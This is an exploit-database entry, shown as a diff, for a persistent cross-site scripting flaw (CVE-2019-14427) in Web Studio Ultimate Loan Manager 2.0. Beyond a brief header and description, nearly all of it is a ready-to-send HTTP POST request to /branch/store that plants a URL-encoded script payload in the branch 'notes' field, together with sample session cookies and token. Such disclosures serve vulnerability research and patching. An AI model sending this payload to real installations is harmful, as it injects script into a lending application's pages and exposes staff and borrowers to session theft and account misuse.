@@ -1,0 +1,28 @@
+# Exploit Title:Web Studio Ultimate Loan Manager V2.0 - Persistent Cross Site Scripting
+# Exploit Author: Metin Yunus Kandemir (kandemir)
+# Vendor Homepage: http://www.webstudio.co.zw/
+# Software Link: https://codecanyon.net/item/ultimate-loan-manager/19891884
+# Version: V2.0
+# Category: Webapps
+# Software Description : Ultimate Loan Manager is an online loam management system that allows lending businesses to manage their borrowers, loans, repayments, and collections with ease while being affordable at the same time.
+# CVE : CVE-2019-14427
+==================================================================
+
+#Description:XSS exists in WEB STUDIO Ultimate Loan Manager 2.0 by adding a branch under the Branches button that sets the notes parameter with crafted JavaScript code.
+
+
+
+POST /branch/store HTTP/1.1
+Host: target
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://target/branch/create
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Cookie: XSRF-TOKEN=eyJpdiI6Imk3Y3llMlBkM0xOUHJNQ1NqYjg2dGc9PSIsInZhbHVlIjoiTmkxMlBlYnVTaHJYR0NZWWxNNEFrSE9PQ3UyUlA5OUg0eU1XUGoxWGR1UUJQbWk2KzRQVVhRTUhEMzBTWkVDMCIsIm1hYyI6Ijk0MGQxN2VhNGQzZDBhZjI4YTg4M2VkODE0NTVhNDFjNmM4MDEwM2U1NGQyOTM3N2FhZDZjMjdjNTUxYjE5ZDMifQ%3D%3D; laravel_session=U1GDgNLtFJQDdPa2jK8rb1vjWE6mkZ6XwrH0PxE7
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+_token=P31Y1Y1VoVj1yaN3lpSQfssubgRXYszMUpilyYSu&name=test&notes=%3cscript%3ealert(1)%3c%2fscript%3e
